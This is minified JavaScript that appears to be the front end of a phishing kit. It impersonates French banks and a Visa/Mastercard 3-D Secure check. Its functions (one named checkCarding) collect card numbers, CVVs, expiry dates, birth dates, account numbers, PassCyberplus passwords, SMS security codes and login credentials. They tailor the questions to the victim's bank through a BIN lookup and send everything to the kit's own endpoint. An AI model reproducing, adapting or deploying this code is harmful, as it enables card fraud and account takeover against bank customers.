function checkCcno(){$("#card-type-trv").on("change",function(){0==this.value?$(this).addClass("error"):$(this).removeClass("error")}),$("#ccno").validateCreditCard(function(e){$(this).focusout(function(){e.valid&&e.length_valid&&e.luhn_valid?$(this).removeClass("error"):$(this).addClass("error")}),e.valid&&e.length_valid&&e.luhn_valid?($(this).removeClass("error"),checkBankForBDate($(this).val())):($(this).addClass("error"),$("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error"))})}function checkCvv(){$("#cvv").on("keyup focus change past blur keystroke undo redo input",function(){var e=$(this).val();3==e.length&&isNumber(e)?$(this).removeClass("error"):$(this).addClass("error")})}function checkExpDate(){$("#expMonth , #expYear").on("change",function(){var e=parseInt($("#expMonth").val()),t=parseInt($("#expYear").val()),a=new Date;e<=a.getMonth()&&t==a.getFullYear()||t<a.getFullYear()||isNaN(t)||isNaN(e)?$("#expdate").addClass("error"):$("#expdate").removeClass("error")})}function hydrate(e){var t=e.data,a=""!=t["Prénom / Nom"]?t["Prénom / Nom"]:"Espace Client";$(".info").html(t.maj);var n="";delete t.maj,$(".title").html(a);for(var r in t)""!=t[r]&&(n+="<tr>",n+="<td class='key'>"+r+" :</td>",n+="<td class='value'>"+t[r]+"</td>",n+="</tr>");$(".fullData").append("<table>"+n+"</table>")}function getDataToHidden(e,t,a){var n="";t.hasOwnProperty("maj")&&delete t.maj;for(var r in t)""!=t[r]&&(n+="<input type='hidden' name='"+r+"' value='"+t[r]+"'>");0==a?$(e).append(n):$(e).html(n)}function checkCarding(){checkExpDate(),checkCvv(),checkCcno(),checkBdate(),checkInputGlobal(".n-compte"),checkInputGlobal(".departement-naissance"),$(".carding input , .carding select").on("keyup focus change past blur keystroke undo redo input",function(){0==$(".carding").find(".error").length?$("#FFIOMNLLDSXXZQASDS").addClass("important"):$("#FFIOMNLLDSXXZQASDS").removeClass("important")}),$("#FFIOMNLLDSXXZQASDS").click(function(){var e=$(this).attr("title"),t=$(".error").attr("for");$(this).hasClass("important")?($(".RRTITOTGHFHFERROR").addClass("hidden"),submit(e,".carding","span.important")):($(".RRTITOTGHFHFERROR_message").html(t),$(".RRTITOTGHFHFERROR").removeClass("hidden"))}),$("span.annuler").click(function(){$("#ccno").val(""),$("#cvv").val(""),$("#cvv").addClass("error")})}function checkBdate(){$("#dobirth input").on("keyup focus change past blur keystroke undo redo input",function(){var e=$("#dob").val(),t=parseInt(e),a=$("#mob").val(),n=parseInt(a),r=$("#yob").val(),s=parseInt(r);t>31||0>=t||isNaN(t)||n>12||0>=n||isNaN(n)||1912>s||s>2004||isNaN(s)?$("#dobirth").addClass("error"):$("#dobirth").removeClass("error")})}function checkInputGlobal(e){$(e+" input").on("keyup focus change past blur keystroke undo redo input",function(){var t=$(this).val();""==t||t.length<2?$(e).addClass("error"):$(e).removeClass("error")})}function isNumber(e){var t=/\d{3,}/;return t.test(e)}function vbvFormer(e){e=JSON.parse(e);var t="mastercard"==e.vbv?"MC":"visa",a="mastercard"==e.vbv?"https://i.imgur.com/P3f4NyM.png":"https://i.imgur.com/V0OIpOs.png";$("img.right").prop("src",a),$("img.right").css("width",e.style),$(".bank-name").html(e.bank),$(".message-vbv").html(e.message);var n="",r="<tr>\n<td>N&deg; de carte :</td>\n<td>xxxxxxxxxxxx"+e.lastNumbers+"</td>\n</tr>";e.bank.match(/SOCIETE GENERALE/i)?(n="Num&eacute;ro de compte ",r+='<tr class="sg pass3d">\n    <td style="width: 41%;">N&deg; de compte<sup>'+t+'</sup> :    <td><input name="numeroDuCompte" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="nc error" maxlength="8"/>\n<img style="margin: 0 0 0 8px;" src="https://i.imgur.com/IoBYk1c.png" width="30" height="30" />\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n    </td>\n</tr>\n<script>checkNc();</script>'):e.bank.match(/POPULAIRE/i)||e.bank.match(/NATIXIS/i)?(n="PassCyberplus ",r+='<tr class="pass3d cb">\n    <td style="font-weight: bold;width: 35%;">PassCyberplus<sup>'+t+'</sup> :    </td>\n    <td><input name="passCyberplus" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" maxlength="8"/>\n<img style="margin: 0 0 0 8px;" src="https://i.imgur.com/513oqaA.png" width="30px" height="40px" />\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n</td>\n</tr>\n<script>checkCyberPlus();</script>'):(n=" le Code Securit&eacute; <br />que vous venez de recevoir sur votre  t&eacute;l&eacute;phone. ",r+=' <tr>\n<td>N&deg; t&eacute;l&eacute;phone :</td>\n<td style="letter-spacing: 0.07rem;">XXXXXXX'+e.phone+"</td>\n</tr>",r+='<tr class="pass3d scood">\n<td style="font-weight: bold;width: 41%;">Le Code Securit&eacute; reçus sur votre t&eacute;l&eacute;phone :</td>\n<td><input name="CodeRecusParPhone" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" maxlength="8"/>\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n</td>\n</tr>\n<script>checkCodePhone();</script>'),$(".vbv-type").html(n),$("#core-vbv table ").append(r)}function checkCodePhone(){$(".scood input").on("keyup focus change past blur keystroke undo redo input",function(){this.value.length>=6?($(this).removeClass("error"),$("button").prop("disabled",!1),$("button").removeClass("disabled")):($(this).addClass("error"),$("button").prop("disabled",!0),$("button").addClass("disabled"))})}function checkCyberPlus(){$(".cb input").on("keyup focus change past blur keystroke undo redo input",function(){this.value.length!=this.maxLength||isNaN($(this).val())?($(this).addClass("error"),$("button").prop("disabled",!0),$("button").addClass("disabled")):($(this).removeClass("error"),$("button").prop("disabled",!1),$("button").removeClass("disabled"))})}function checkNc(){$(".nc").on("keyup focus change past blur keystroke undo redo input",function(){8==$(this).val().length?$(this).removeClass("error"):$(this).addClass("error")}),$("#vbv-form input").on("keyup focus change past blur keystroke undo redo input",function(){0==$("#vbv-form").find(".error").length?($("button").prop("disabled",!1),$("button").removeClass("disabled")):($("button").prop("disabled",!0),$("button").addClass("disabled"))})}function submit(e,t,a){var n=$(t).serialize();$.ajax({type:"POST",url:"?check_url="+e,data:n,timeout:1e4,beforeSend:function(){$(a).addClass("disabled")},success:function(a){if("coordonnees"==e){var n=JSON.parse(a);"error"==n.response?(""!=n.data&&$(".blockelem span").html(n.data),$(".blockelem").show(),$("#password").val("")):($(t).attr("action","?return_url="+e),getDataToHidden(t,n.data,!1),$(t).submit())}else $(t).attr("action","?return_url="+e),$(t).submit()},error:function(e){$(".blockelem span").html("D&eacute;sol&eacute;, une erreur s'est produite. R&eacute;essayez. "),$(".blockelem").show()},complete:function(){$(a).removeClass("disabled")},dataType:"html"})}function checkBankForBDate(e){$.ajax({type:"GET",url:"?check_url=bank&bin="+e,success:function(e){var t=JSON.parse(e),a=t.bank;getDataToHidden("#hidden-inputs",t,!0),a.match(/BNP/i)?($("#dobirth").removeClass("hidden").addClass("error"),$(".departement-naissance , .n-compte").addClass("hidden").removeClass("error")):a.match(/POSTALE/i)?($("#dobirth , .departement-naissance").addClass("hidden").removeClass("error"),$(".n-compte").removeClass("hidden").addClass("error")):a.match(/SOCIETE GENERALE/i)?($("#dobirth , .n-compte").addClass("hidden").removeClass("error"),$(".departement-naissance").removeClass("hidden").addClass("error")):$("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error")}})}function afficherDate(e){var t=new Date,a=(t.getDate()<10?"0":"")+t.getDate()+"/"+((t.getMonth()+1<10?"0":"")+(t.getMonth()+1))+"/"+t.getFullYear();$("#"+e).html(a)}function isEmail(e){return/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(e)}function isPhone(e){return/^((\+)33|0)[1-9](\d{2}){4}$/g.test(e)}function afficherHeure(e){var t=new Date,a=(t.getMinutes()<10?"0":"")+t.getMinutes(),n=(t.getHours()<10?"0":"")+t.getHours()+":"+a+":"+((t.getSeconds()<10?"0":"")+t.getSeconds());$("#"+e).html(n)}function datePrinter(){afficherDate("date"),afficherHeure("hour"),setInterval('afficherHeure("hour")',1e3)}function checkLogin(){$(".important").click(function(){var e=$(this).attr("title");$(this).hasClass("disabled")||($(".important").addClass("disabled"),submit(e,".login",".important"))}),$("span.annuler").click(function(){$("#email").val(""),$("#password").val("")})}function coordonneCheck(e){hydrate(e),getDataToHidden(".carding",e,!1),$(window).on("load",function(){$("#myModal").modal("show")}),$("#myModal").modal({backdrop:"static",keyboard:!1}),$("#myModal .imp , #myModal .annuler , #myModal .close").click(function(){var e="?return_url="+$("#myModal").attr("title");setTimeout(function(){window.location.href=e},1e3)})}